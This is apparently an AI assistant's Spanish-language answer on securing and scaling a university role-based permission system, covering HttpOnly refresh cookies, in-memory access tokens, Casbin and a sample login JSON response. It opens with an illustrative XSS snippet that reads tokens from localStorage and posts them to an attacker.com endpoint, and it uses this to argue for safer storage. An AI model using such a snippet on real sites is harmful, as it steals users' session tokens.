Excelente pregunta. Tienes toda la razón en preocuparte. Déjame darte un análisis profundo sobre **escalabilidad** y **seguridad**.

---

## 🔒 SEGURIDAD: El LocalStorage es un RIESGO

### **El Problema Real**

LocalStorage es vulnerable a ataques XSS (Cross-Site Scripting) porque es fácilmente accesible mediante JavaScript, y un atacante puede recuperar tu token de acceso y usarlo posteriormente.

Si guardas los permisos en `localStorage`:
```javascript
// ❌ VULNERABLE
localStorage.setItem('permissions', JSON.stringify(permisos));
localStorage.setItem('token', jwt);
```

**Un atacante puede hacer:**
```javascript
// Script malicioso inyectado
const stolenToken = localStorage.getItem('token');
const stolenPerms = localStorage.getItem('permissions');

// Enviar a servidor del atacante
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolenToken, perms: stolenPerms })
});
```

---

## ✅ SOLUCIÓN: Arquitectura Segura Recomendada

### **Estrategia de Almacenamiento en 3 Niveles**

```
┌─────────────────────────────────────────────────────────┐
│              ARQUITECTURA SEGURA                        │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  1. REFRESH TOKEN (Long-lived)                          │
│     └─> HttpOnly Cookie                                 │
│         • Secure flag                                   │
│         • SameSite=Strict                              │
│         • No accesible por JavaScript                   │
│         • Duración: 7-30 días                          │
│                                                         │
│  2. ACCESS TOKEN (Short-lived)                          │
│     └─> Memoria (React State/Context)                   │
│         • Solo en RAM                                   │
│         • Se pierde al refrescar página                │
│         • Duración: 15 minutos                         │
│                                                         │
│  3. PERMISOS ESTRUCTURA                                 │
│     └─> Memoria (React State/Context)                   │
│         • Se recarga del servidor al refrescar          │
│         • Nunca en localStorage                         │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

## 🛡️ Implementación Segura

### **Backend: Endpoints Ajustados**

```json
// POST /api/v1/auth/login
{
  "response": {
    "access_token": "eyJhbGc...",  // JWT corto (15 min)
    "token_type": "Bearer",
    "expires_in": 900,  // 15 minutos
    "user": {
      "id": 12345,
      "nombre": "Juan Pérez"
    }
  },
  "headers": {
    "Set-Cookie": "refresh_token=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000; Path=/api/v1/auth/refresh"
  }
}

// ✅ El refresh_token NUNCA llega al JavaScript
// ✅ Solo el navegador lo maneja automáticamente
```

```json
// POST /api/v1/auth/refresh (Automático al expirar access_token)
// El browser envía automáticamente la cookie HttpOnly

{
  "access_token": "eyJhbGc...",  // Nuevo token
  "expires_in": 900,
  "permissions": { /* permisos actualizados */ }
}
```

```json
// GET /api/v1/auth/permissions
// Header: Authorization: Bearer {access_token}

{
  "islas": [...],
  "permisos": {...},
  "permisos_individuales": [...]
}
```

---

### **Frontend: Almacenamiento Seguro**

```javascript
// ❌ NUNCA HAGAS ESTO
localStorage.setItem('token', jwt);
localStorage.setItem('permissions', JSON.stringify(perms));

// ✅ ARQUITECTURA CORRECTA
// AuthContext.jsx

import { createContext, useState, useEffect, useCallback } from 'react';

const AuthContext = createContext();

export const AuthProvider = ({ children }) => {
  // ✅ Access token en memoria (se pierde al refrescar)
  const [accessToken, setAccessToken] = useState(null);
  
  // ✅ Permisos en memoria
  const [permissions, setPermissions] = useState(null);
  
  // ✅ Estado de carga
  const [isLoading, setIsLoading] = useState(true);

  // Función para refrescar token automáticamente
  const refreshAccessToken = useCallback(async () => {
    try {
      // El refresh_token se envía automáticamente como HttpOnly cookie
      const response = await fetch('/api/v1/auth/refresh', {
        method: 'POST',
        credentials: 'include', // ⚠️ CRÍTICO: envía cookies
      });

      if (!response.ok) {
        throw new Error('Refresh failed');
      }

      const data = await response.json();
      
      // Guardar SOLO en memoria
      setAccessToken(data.access_token);
      setPermissions(data.permissions);
      
      return data.access_token;
    } catch (error) {
      // Token expirado, redirigir a login
      logout();
      return null;
    }
  }, []);

  // Auto-refresh al iniciar (recuperar sesión)
  useEffect(() => {
    const initAuth = async () => {
      await refreshAccessToken();
      setIsLoading(false);
    };

    initAuth();
  }, [refreshAccessToken]);

  // Auto-refresh periódico (cada 14 minutos)
  useEffect(() => {
    if (!accessToken) return;

    const interval = setInterval(() => {
      refreshAccessToken();
    }, 14 * 60 * 1000); // 14 minutos

    return () => clearInterval(interval);
  }, [accessToken, refreshAccessToken]);

  const login = async (email, password) => {
    const response = await fetch('/api/v1/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include', // ⚠️ CRÍTICO: recibe cookies
      body: JSON.stringify({ email, password }),
    });

    const data = await response.json();
    
    // ✅ Solo en memoria
    setAccessToken(data.access_token);
    setPermissions(data.permissions);
  };

  const logout = async () => {
    await fetch('/api/v1/auth/logout', {
      method: 'POST',
      credentials: 'include',
    });

    // Limpiar memoria
    setAccessToken(null);
    setPermissions(null);
  };

  return (
    <AuthContext.Provider value={{
      accessToken,
      permissions,
      isLoading,
      login,
      logout,
      refreshAccessToken
    }}>
      {children}
    </AuthContext.Provider>
  );
};
```

---

### **Interceptor Axios para Manejo Automático**

```javascript
// api/axiosConfig.js

import axios from 'axios';

const api = axios.create({
  baseURL: '/api/v1',
  withCredentials: true, // ⚠️ CRÍTICO: envía cookies
});

let isRefreshing = false;
let failedQueue = [];

const processQueue = (error, token = null) => {
  failedQueue.forEach(prom => {
    if (error) {
      prom.reject(error);
    } else {
      prom.resolve(token);
    }
  });
  failedQueue = [];
};

// Interceptor de request
api.interceptors.request.use(
  (config) => {
    const token = getAccessTokenFromMemory(); // De tu Context
    if (token) {
      config.headers['Authorization'] = `Bearer ${token}`;
    }
    return config;
  },
  (error) => Promise.reject(error)
);

// Interceptor de response (auto-refresh en 401)
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    if (error.response?.status === 401 && !originalRequest._retry) {
      if (isRefreshing) {
        // Si ya está refrescando, encolar request
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        })
          .then(token => {
            originalRequest.headers['Authorization'] = `Bearer ${token}`;
            return api(originalRequest);
          })
          .catch(err => Promise.reject(err));
      }

      originalRequest._retry = true;
      isRefreshing = true;

      try {
        const newToken = await refreshAccessToken(); // De tu Context
        processQueue(null, newToken);
        originalRequest.headers['Authorization'] = `Bearer ${newToken}`;
        return api(originalRequest);
      } catch (refreshError) {
        processQueue(refreshError, null);
        // Redirigir a login
        window.location.href = '/login';
        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }

    return Promise.reject(error);
  }
);

export default api;
```

---

## 📊 ESCALABILIDAD: Análisis Completo

### **1. Escalabilidad de Almacenamiento**

| Aspecto | Evaluación | Detalles |
|---------|-----------|----------|
| **Tamaño de Permisos** | ⚠️ **Moderado** | JSON de permisos completo puede ser 50-200KB para usuarios con múltiples islas |
| **HttpOnly Cookies** | ❌ **Limitado** | Máximo 4KB por cookie - NO es viable para permisos grandes |
| **Solución** | ✅ **Memory + API** | Cargar permisos desde API en cada sesión, mantener en memoria |

**Recomendación**: 
```javascript
// ✅ ENFOQUE HÍBRIDO
{
  "cookies": {
    "refresh_token": "abc123...",  // Solo token
    "user_id": "12345"             // Metadata mínima
  },
  "memory": {
    "access_token": "eyJhbGc...",
    "permissions": { /* estructura completa */ }
  }
}
```

---

### **2. Escalabilidad de Consultas**

```javascript
// ❌ MALO: Consultar permisos en cada request
useEffect(() => {
  fetch('/api/permissions/check', {
    method: 'POST',
    body: JSON.stringify({ recurso: 'X', accion: 'Y' })
  });
}, [recurso]);

// ✅ BUENO: Estructura en memoria + validación local
const { hasPermission } = usePermissions();

if (hasPermission('RECTOR', 'ESTUDIANTES', 'GESTIONAR', 'delete')) {
  // Renderizar botón
}

// ✅ El backend SIEMPRE valida de nuevo
```

**Flujo Optimizado**:
```
1. Login → Carga permisos completos (1 request)
2. Navegación → Validación local en memoria (0 requests)
3. Acción CRUD → Backend valida nuevamente (seguridad)
4. Refresh cada 15 min → Actualiza permisos (1 request)
```

---

### **3. Escalabilidad de Base de Datos**

**Proyección de Crecimiento**:

```sql
-- Escenario: Universidad con 50,000 usuarios

-- TABLA: users
50,000 registros × 1KB = 50 MB

-- TABLA: role_resource_permissions
5 roles × 20 módulos × 10 recursos × 4 acciones 
= 4,000 registros × 500 bytes = 2 MB

-- TABLA: user_individual_permissions
10% usuarios con permisos individuales
5,000 × 5 permisos × 300 bytes = 7.5 MB

-- TOTAL PERMISOS: ~60 MB
-- ✅ Altamente escalable
```

**Optimizaciones**:
```sql
-- Índices críticos
CREATE INDEX idx_role_context ON role_context_permissions(role_id, context_id);
CREATE INDEX idx_user_perms ON user_individual_permissions(user_id, expires_at);
CREATE INDEX idx_resource_module ON resources(module_id, is_active);

-- Particionamiento para auditoría
CREATE TABLE auditoria_permisos_2024 PARTITION OF auditoria_permisos
FOR VALUES FROM ('2024-01-01') TO ('2025-01-01');
```

---

### **4. Escalabilidad de Casbin**

**Rendimiento de Casbin**:
```javascript
// Políticas en memoria (cargadas al inicio)
- 10,000 políticas: ~2ms por verificación
- 100,000 políticas: ~5ms por verificación
- 1,000,000 políticas: ~20ms por verificación

// ✅ Para 50,000 usuarios con 5 roles promedio:
- Total políticas: ~250,000
- Tiempo de verificación: ~5-10ms
- Altamente escalable
```

**Optimización Casbin**:
```javascript
// Caché de políticas en Redis
await enforcer.loadPolicy(); // Al iniciar servidor

// Auto-refresh cada hora
setInterval(() => {
  enforcer.loadPolicy();
}, 3600000);

// Invalidar caché al cambiar permisos
await enforcer.removePolicy(policy);
await enforcer.savePolicy();
```

---

### **5. Escalabilidad Horizontal**

```
┌────────────────────────────────────────────────────┐
│          ARQUITECTURA ESCALABLE                    │
├────────────────────────────────────────────────────┤
│                                                    │
│  Load Balancer (nginx)                             │
│       │                                            │
│       ├─> API Server 1  ────┐                      │
│       ├─> API Server 2  ────┼──> Redis Cache      │
│       └─> API Server N  ────┘     (permisos)      │
│                                        │           │
│                                   PostgreSQL       │
│                                   (permisos base)  │
│                                                    │
└────────────────────────────────────────────────────┘

✅ Cada servidor carga políticas Casbin en memoria
✅ Redis para caché compartido
✅ Invalidación distribuida con pub/sub
```

---

## ⚠️ COMPARACIÓN: Seguridad vs Conveniencia

| Método | Seguridad | Escalabilidad | Complejidad | Recomendación |
|--------|-----------|---------------|-------------|---------------|
| **LocalStorage** | ❌ Bajo (XSS vulnerable) | ✅ Alta | ✅ Baja | ❌ NO usar para tokens |
| **HttpOnly Cookies** | ✅ Alta | ❌ Limitada (4KB) | ⚠️ Media | ✅ Solo refresh token |
| **Memory + HttpOnly** | ✅✅ Muy Alta | ✅✅ Muy Alta | ⚠️⚠️ Alta | ✅✅ **RECOMENDADO** |

---

## 🎯 ESTRATEGIA FINAL RECOMENDADA

### **Lo que SÍ debes hacer:**

1. **Refresh Token en HttpOnly Cookie**
   - `Secure`, `SameSite=Strict`, `HttpOnly`
   - Duración: 30 días
   - Solo para renovar access tokens

2. **Access Token en Memoria**
   - Duración: 15 minutos
   - Se pierde al refrescar página
   - Auto-refresh silencioso

3. **Permisos en Memoria**
   - Recarga desde API al iniciar sesión
   - Recarga al refrescar página (usando refresh token)
   - Cache TTL de 15 minutos

4. **Validación Doble**
   - Frontend: validación rápida en memoria
   - Backend: validación autoritativa con Casbin

5. **Auditoría Completa**
   - Log de todos los accesos
   - Log de cambios de permisos
   - Detección de anomalías

### **Lo que NO debes hacer:**

❌ Guardar tokens en `localStorage`
❌ Guardar permisos en `localStorage`
❌ Enviar permisos completos en JWT
❌ Confiar solo en validación frontend
❌ Tokens de larga duración en JavaScript

---

## 📈 Conclusión: Tu Sistema ES Escalable y PUEDE Ser Seguro

**Escalabilidad**: ✅✅ **Excelente** (hasta millones de usuarios)
**Seguridad Actual**: ❌ **Insuficiente** (por localStorage)
**Seguridad con Mejoras**: ✅✅ **Enterprise-grade**

**Esfuerzo de Migración**: ⚠️ Medio (2-3 días de desarrollo)
**Beneficio**: ✅✅ Crítico (protección contra ataques)

¿Quieres que te ayude con el código específico para migrar de `localStorage` a la arquitectura segura con `HttpOnly cookies` + `Memory`?


# 🔥 JSON Completo que Llega al Frontend tras Login

## Response Completo de POST /api/v1/auth/login

```json
{
  "success": true,
  "data": {
    "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsInJvbGVzIjpbInJlY3RvciIsInByb2Zlc29yIl0sImlhdCI6MTczNDI3MzYwMCwiZXhwIjoxNzM0Mjc0NTAwfQ.xyz...",
    "token_type": "Bearer",
    "expires_in": 900,
    "issued_at": "2024-12-15T10:00:00Z",
    
    "user": {
      "id_persona": 12345,
      "documento_identidad": "12345678",
      "nombre": "Juan Carlos",
      "apellidos": "Pérez García",
      "nombre_completo": "Juan Carlos Pérez García",
      "email": "juan.perez@universidad.edu",
      "telefono": "+51999888777",
      "foto_url": "https://cdn.universidad.edu/photos/12345.jpg",
      
      "roles_base": ["profesor", "autoridad"],
      
      "tipo_autoridad": {
        "id": 2,
        "codigo": "RECTOR",
        "nombre": "Rector",
        "descripcion": "Máxima autoridad académica",
        "nivel_jerarquia": 1,
        "vigencia": {
          "desde": "2024-01-01T00:00:00Z",
          "hasta": "2026-12-31T23:59:59Z"
        }
      },
      
      "profesor": {
        "id_profesor": 456,
        "especialidad": "Ingeniería de Software",
        "grado_academico": "Doctor",
        "estado": "activo"
      },
      
      "estado_cuenta": "activa",
      "requiere_cambio_password": false,
      "ultima_sesion": "2024-12-14T15:30:00Z"
    },
    
    "permissions": {
      "islas": [
        {
          "id": "isla_1",
          "codigo": "RECTOR",
          "nombre": "Rector",
          "descripcion": "Gestión y supervisión universitaria",
          "icono": "shield",
          "color": "#8B0000",
          "ruta_default": "/portal/rector/dashboard",
          "es_isla_principal": true,
          "orden": 1
        },
        {
          "id": "isla_2",
          "codigo": "PROFESOR",
          "nombre": "Profesor",
          "descripcion": "Gestión académica docente",
          "icono": "graduation-cap",
          "color": "#1E3A8A",
          "ruta_default": "/portal/profesor/cursos",
          "es_isla_principal": false,
          "orden": 2
        }
      ],
      
      "permisos": {
        "RECTOR": {
          "contexto": "RECTOR",
          "modulos": [
            {
              "id": "mod_principal",
              "codigo": "PRINCIPAL",
              "nombre": "Principal",
              "descripcion": "Panel principal de control",
              "icono": "layout-dashboard",
              "orden": 1,
              "recursos": [
                {
                  "id": "res_dashboard",
                  "codigo": "DASHBOARD",
                  "nombre": "Dashboard",
                  "descripcion": "Panel de control ejecutivo",
                  "ruta_frontend": "/portal/rector/dashboard",
                  "icono": "layout-dashboard",
                  "orden": 1,
                  "acciones": {
                    "read": {
                      "permitido": true,
                      "endpoint": "/api/v1/rector/dashboard",
                      "metodo": "GET",
                      "descripcion": "Ver panel de control"
                    }
                  }
                }
              ]
            },
            {
              "id": "mod_estudiantes",
              "codigo": "ESTUDIANTES",
              "nombre": "Estudiantes",
              "descripcion": "Gestión de estudiantes",
              "icono": "users",
              "orden": 2,
              "recursos": [
                {
                  "id": "res_ver_estudiantes",
                  "codigo": "VER_ESTUDIANTES",
                  "nombre": "Ver Estudiantes",
                  "descripcion": "Visualizar lista de estudiantes",
                  "ruta_frontend": "/portal/rector/estudiantes",
                  "icono": "users",
                  "orden": 1,
                  "acciones": {
                    "read": {
                      "permitido": true,
                      "endpoint": "/api/v1/estudiantes",
                      "metodo": "GET",
                      "descripcion": "Listar estudiantes"
                    }
                  }
                },
                {
                  "id": "res_gestionar_estudiantes",
                  "codigo": "GESTIONAR_ESTUDIANTES",
                  "nombre": "Gestionar Estudiantes",
                  "descripcion": "Crear y editar estudiantes",
                  "ruta_frontend": "/portal/rector/estudiantes/gestionar",
                  "icono": "user-cog",
                  "orden": 2,
                  "acciones": {
                    "read": {
                      "permitido": true,
                      "endpoint": "/api/v1/estudiantes/:id",
                      "metodo": "GET",
                      "descripcion": "Ver detalle de estudiante"
                    },
                    "create": {
                      "permitido": true,
                      "endpoint": "/api/v1/estudiantes",
                      "metodo": "POST",
                      "descripcion": "Crear nuevo estudiante"
                    },
                    "update": {
                      "permitido": true,
                      "endpoint": "/api/v1/estudiantes/:id",
                      "metodo": "PUT",
                      "descripcion": "Actualizar datos de estudiante"
                    },
                    "delete": {
                      "permitido": false,
                      "endpoint": "/api/v1/estudiantes/:id",
                      "metodo": "DELETE",
                      "descripcion": "Eliminar estudiante",
                      "razon_denegado": "Permiso no incluido en rol base"
                    }
                  }
                },
                {
                  "id": "res_exportar_estudiantes",
                  "codigo": "EXPORTAR_ESTUDIANTES",
                  "nombre": "Exportar Estudiantes",
                  "descripcion": "Exportar listados en Excel/PDF",
                  "ruta_frontend": "/portal/rector/estudiantes/exportar",
                  "icono": "download",
                  "orden": 3,
                  "acciones": {
                    "read": {
                      "permitido": true,
                      "endpoint": "/api/v1/estudiantes/export",
                      "metodo": "GET",
                      "descripcion": "Exportar datos"
                    }
                  }
                }
              ]
            },
            {
              "id": "mod_academico",
              "codigo": "ACADEMICO",
              "nombre": "Académico",
              "descripcion": "Gestión académica",
              "icono": "book-open",
              "orden": 3,
              "recursos": [
                {
                  "id": "res_ver_notas",
                  "codigo": "VER_NOTAS",
                  "nombre": "Ver Notas",
                  "descripcion": "Visualizar calificaciones",
                  "ruta_frontend": "/portal/rector/academico/notas",
                  "icono": "file-text",
                  "orden": 1,
                  "acciones": {
                    "read": {
                      "permitido": true,
                      "endpoint": "/api/v1/notas",
                      "metodo": "GET",
                      "descripcion": "Listar notas"
                    }
                  }
                },
                {
                  "id": "res_registrar_notas",
                  "codigo": "REGISTRAR_NOTAS",
                  "nombre": "Registrar Notas",
                  "descripcion": "Registrar calificaciones",
                  "ruta_frontend": "/portal/rector/academico/notas/registrar",
                  "icono": "edit",
                  "orden": 2,
                  "acciones": {
                    "create": {
                      "permitido": false,
                      "endpoint": "/api/v1/notas",
                      "metodo": "POST",
                      "descripcion": "Crear registro de nota",
                      "razon_denegado": "Solo profesores pueden registrar notas"
                    },
                    "update": {
                      "permitido": false,
                      "endpoint": "/api/v1/notas/:id",
                      "metodo": "PUT",
                      "descripcion": "Modificar nota",
                      "razon_denegado": "Solo profesores pueden modificar notas"
                    }
                  }
                },
                {
                  "id": "res_aprobar_notas",
                  "codigo": "APROBAR_NOTAS",
                  "nombre": "Aprobar Notas",
                  "descripcion": "Aprobar actas de notas",
                  "ruta_frontend": "/portal/rector/academico/notas/aprobar",
                  "icono": "check-circle",
                  "orden": 3,
                  "acciones": {
                    "update": {
                      "permitido": true,
                      "endpoint": "/api/v1/notas/:id/aprobar",
                      "metodo": "POST",
                      "descripcion": "Aprobar acta de notas"
                    }
                  }
                },
                {
                  "id": "res_ver_actas",
                  "codigo": "VER_ACTAS",
                  "nombre": "Ver Actas",
                  "descripcion": "Visualizar actas oficiales",
                  "ruta_frontend": "/portal/rector/academico/actas",
                  "icono": "file-check",
                  "orden": 4,
                  "acciones": {
                    "read": {
                      "permitido": true,
                      "endpoint": "/api/v1/actas",
                      "metodo": "GET",
                      "descripcion": "Listar actas"
                    }
                  }
                },
                {
                  "id": "res_firmar_actas",
                  "codigo": "FIRMAR_ACTAS",
                  "nombre": "Firmar Actas",
                  "descripcion": "Firma digital de actas",
                  "ruta_frontend": "/portal/rector/academico/actas/firmar",
                  "icono": "pen-tool",
                  "orden": 5,
                  "acciones": {
                    "update": {
                      "permitido": true,
                      "endpoint": "/api/v1/actas/:id/firmar",
                      "metodo": "POST",
                      "descripcion": "Firmar acta digitalmente"
                    }
                  }
                }
              ]
            },
            {
              "id": "mod_programas",
              "codigo": "PROGRAMAS",
              "nombre": "Programas",
              "descripcion": "Gestión de programas académicos",
              "icono": "layers",
              "orden": 4,
              "recursos": [
                {
                  "id": "res_ver_programas",
                  "codigo": "VER_PROGRAMAS",
                  "nombre": "Ver Programas",
                  "descripcion": "Visualizar programas académicos",
                  "ruta_frontend": "/portal/rector/programas",
                  "icono": "layers",
                  "orden": 1,
                  "acciones": {
                    "read": {
                      "permitido": true,
                      "endpoint": "/api/v1/programas",
                      "metodo": "GET",
                      "descripcion": "Listar programas"
                    }
                  }
                },
                {
                  "id": "res_gestionar_programas",
                  "codigo": "GESTIONAR_PROGRAMAS",
                  "nombre": "Gestionar Programas",
                  "descripcion": "Crear y editar programas",
                  "ruta_frontend": "/portal/rector/programas/gestionar",
                  "icono": "settings",
                  "orden": 2,
                  "acciones": {
                    "read": {
                      "permitido": true,
                      "endpoint": "/api/v1/programas/:id",
                      "metodo": "GET",
                      "descripcion": "Ver detalle de programa"
                    },
                    "create": {
                      "permitido": true,
                      "endpoint": "/api/v1/programas",
                      "metodo": "POST",
                      "descripcion": "Crear nuevo programa"
                    },
                    "update": {
                      "permitido": true,
                      "endpoint": "/api/v1/programas/:id",
                      "metodo": "PUT",
                      "descripcion": "Actualizar programa"
                    },
                    "delete": {
                      "permitido": false,
                      "endpoint": "/api/v1/programas/:id",
                      "metodo": "DELETE",
                      "descripcion": "Eliminar programa",
                      "razon_denegado": "Requiere aprobación del consejo"
                    }
                  }
                }
              ]
            },
            {
              "id": "mod_reportes",
              "codigo": "REPORTES",
              "nombre": "Reportes",
              "descripcion": "Reportes ejecutivos",
              "icono": "bar-chart",
              "orden": 5,
              "recursos": [
                {
                  "id": "res_reportes_ejecutivos",
                  "codigo": "REPORTES_EJECUTIVOS",
                  "nombre": "Reportes Ejecutivos",
                  "descripcion": "Reportes de alta dirección",
                  "ruta_frontend": "/portal/rector/reportes",
                  "icono": "bar-chart",
                  "orden": 1,
                  "acciones": {
                    "read": {
                      "permitido": true,
                      "endpoint": "/api/v1/reportes/ejecutivos",
                      "metodo": "GET",
                      "descripcion": "Ver reportes ejecutivos"
                    }
                  }
                }
              ]
            }
          ]
        },
        
        "PROFESOR": {
          "contexto": "PROFESOR",
          "modulos": [
            {
              "id": "mod_cursos",
              "codigo": "CURSOS",
              "nombre": "Mis Cursos",
              "descripcion": "Gestión de cursos asignados",
              "icono": "book",
              "orden": 1,
              "recursos": [
                {
                  "id": "res_ver_cursos",
                  "codigo": "VER_CURSOS",
                  "nombre": "Ver Cursos",
                  "descripcion": "Ver cursos asignados",
                  "ruta_frontend": "/portal/profesor/cursos",
                  "icono": "book",
                  "orden": 1,
                  "acciones": {
                    "read": {
                      "permitido": true,
                      "endpoint": "/api/v1/profesor/cursos",
                      "metodo": "GET",
                      "descripcion": "Listar mis cursos"
                    }
                  }
                },
                {
                  "id": "res_gestionar_contenido",
                  "codigo": "GESTIONAR_CONTENIDO",
                  "nombre": "Gestionar Contenido",
                  "descripcion": "Subir material de clase",
                  "ruta_frontend": "/portal/profesor/cursos/:id/contenido",
                  "icono": "upload",
                  "orden": 2,
                  "acciones": {
                    "read": {
                      "permitido": true,
                      "endpoint": "/api/v1/cursos/:id/contenido",
                      "metodo": "GET",
                      "descripcion": "Ver contenido"
                    },
                    "create": {
                      "permitido": true,
                      "endpoint": "/api/v1/cursos/:id/contenido",
                      "metodo": "POST",
                      "descripcion": "Subir contenido"
                    },
                    "update": {
                      "permitido": true,
                      "endpoint": "/api/v1/cursos/:id/contenido/:contentId",
                      "metodo": "PUT",
                      "descripcion": "Actualizar contenido"
                    },
                    "delete": {
                      "permitido": true,
                      "endpoint": "/api/v1/cursos/:id/contenido/:contentId",
                      "metodo": "DELETE",
                      "descripcion": "Eliminar contenido"
                    }
                  }
                }
              ]
            },
            {
              "id": "mod_calificaciones",
              "codigo": "CALIFICACIONES",
              "nombre": "Calificaciones",
              "descripcion": "Registro de notas",
              "icono": "award",
              "orden": 2,
              "recursos": [
                {
                  "id": "res_registrar_calificaciones",
                  "codigo": "REGISTRAR_CALIFICACIONES",
                  "nombre": "Registrar Calificaciones",
                  "descripcion": "Ingresar notas de estudiantes",
                  "ruta_frontend": "/portal/profesor/calificaciones",
                  "icono": "edit",
                  "orden": 1,
                  "acciones": {
                    "read": {
                      "permitido": true,
                      "endpoint": "/api/v1/profesor/calificaciones",
                      "metodo": "GET",
                      "descripcion": "Ver calificaciones"
                    },
                    "create": {
                      "permitido": true,
                      "endpoint": "/api/v1/profesor/calificaciones",
                      "metodo": "POST",
                      "descripcion": "Registrar calificación"
                    },
                    "update": {
                      "permitido": true,
                      "endpoint": "/api/v1/profesor/calificaciones/:id",
                      "metodo": "PUT",
                      "descripcion": "Actualizar calificación"
                    }
                  }
                }
              ]
            },
            {
              "id": "mod_asistencia",
              "codigo": "ASISTENCIA",
              "nombre": "Asistencia",
              "descripcion": "Control de asistencia",
              "icono": "clipboard-check",
              "orden": 3,
              "recursos": [
                {
                  "id": "res_registrar_asistencia",
                  "codigo": "REGISTRAR_ASISTENCIA",
                  "nombre": "Registrar Asistencia",
                  "descripcion": "Tomar asistencia de clase",
                  "ruta_frontend": "/portal/profesor/asistencia",
                  "icono": "clipboard-check",
                  "orden": 1,
                  "acciones": {
                    "read": {
                      "permitido": true,
                      "endpoint": "/api/v1/profesor/asistencia",
                      "metodo": "GET",
                      "descripcion": "Ver asistencia"
                    },
                    "create": {
                      "permitido": true,
                      "endpoint": "/api/v1/profesor/asistencia",
                      "metodo": "POST",
                      "descripcion": "Registrar asistencia"
                    },
                    "update": {
                      "permitido": true,
                      "endpoint": "/api/v1/profesor/asistencia/:id",
                      "metodo": "PUT",
                      "descripcion": "Corregir asistencia"
                    }
                  }
                }
              ]
            }
          ]
        }
      },
      
      "permisos_individuales": [
        {
          "id": "perm_individual_1",
          "tipo": "accion_especifica",
          "isla": "RECTOR",
          "modulo": "ESTUDIANTES",
          "recurso": "GESTIONAR_ESTUDIANTES",
          "accion": "delete",
          "descripcion": "Permiso especial para eliminar estudiantes",
          "otorgado_por": {
            "id_persona": 1,
            "nombre": "Super Admin"
          },
          "fecha_otorgamiento": "2024-12-01T10:00:00Z",
          "expira_en": "2025-06-01T23:59:59Z",
          "razon": "Permiso temporal para limpieza de registros históricos del período 2020-2022",
          "es_temporal": true,
          "dias_restantes": 168
        },
        {
          "id": "perm_individual_2",
          "tipo": "modulo_completo",
          "isla": "RECTOR",
          "modulo": "FINANZAS",
          "descripcion": "Acceso completo al módulo de finanzas",
          "otorgado_por": {
            "id_persona": 1,
            "nombre": "Super Admin"
          },
          "fecha_otorgamiento": "2024-11-15T10:00:00Z",
          "expira_en": null,
          "razon": "Supervisor financiero temporal mientras se contrata nuevo director financiero",
          "es_temporal": false
        }
      ],
      
      "metadata": {
        "total_islas": 2,
        "total_modulos": 8,
        "total_recursos": 19,
        "total_permisos_activos": 47,
        "permisos_individuales_count": 2,
        "isla_principal": "RECTOR"
      }
    }
  },
  
  "meta": {
    "timestamp": "2024-12-15T10:00:00Z",
    "request_id": "req_abc123xyz789",
    "server_version": "2.5.0"
  }
}
```

---

## 📦 Headers de la Response

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: refresh_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsInR5cGUiOiJyZWZyZXNoIiwiaWF0IjoxNzM0MjczNjAwLCJleHAiOjE3MzY4NjU2MDB9.abc...; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000; Path=/api/v1/auth
X-Request-ID: req_abc123xyz789
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 99
X-RateLimit-Reset: 1734274500
Cache-Control: no-store, no-cache, must-revalidate, private
Pragma: no-cache
Content-Length: 28547
```

---

## 🎯 Tamaño Real

```
JSON sin comprimir: ~28 KB
JSON con gzip:      ~6-8 KB
Tiempo de respuesta: 200-400ms
```

---

## 🔑 Puntos Clave del JSON

### **1. Estructura en 3 Partes Principales**

```javascript
{
  "access_token": "...",     // Token JWT de 15 minutos
  "user": {...},             // Info del usuario
  "permissions": {...}       // 🔥 TODOS los permisos
}
```

### **2. Cada Recurso Incluye**

- ✅ Ruta del frontend (`ruta_frontend`)
- ✅ Endpoint de backend (`endpoint`)
- ✅ Método HTTP (`metodo`)
- ✅ Estado del permiso (`permitido: true/false`)
- ✅ Razón si está denegado (`razon_denegado`)

### **3. Permisos Individuales Identificables**

Los permisos extras que el Super Admin otorga vienen en un array separado con:
- ✅ Qué se otorgó exactamente
- ✅ Quién lo otorgó
- ✅ Cuándo expira
- ✅ Por qué se otorgó

---

## 💾 ¿Qué Hace el Frontend con Este JSON?

```javascript
// Guardar TODO en memoria (Context)
const { data } = await response.json();

setAccessToken(data.access_token);        // Token en memoria
setUser(data.user);                       // Usuario en memoria
setPermissions(data.permissions);         // Permisos en memoria

// NO se guarda NADA en localStorage
// El refresh_token ya vino en cookies HttpOnly
```

---

¿Está más claro ahora? ¿Necesitas que te muestre cómo el frontend procesa este JSON para generar el sidebar dinámicamente?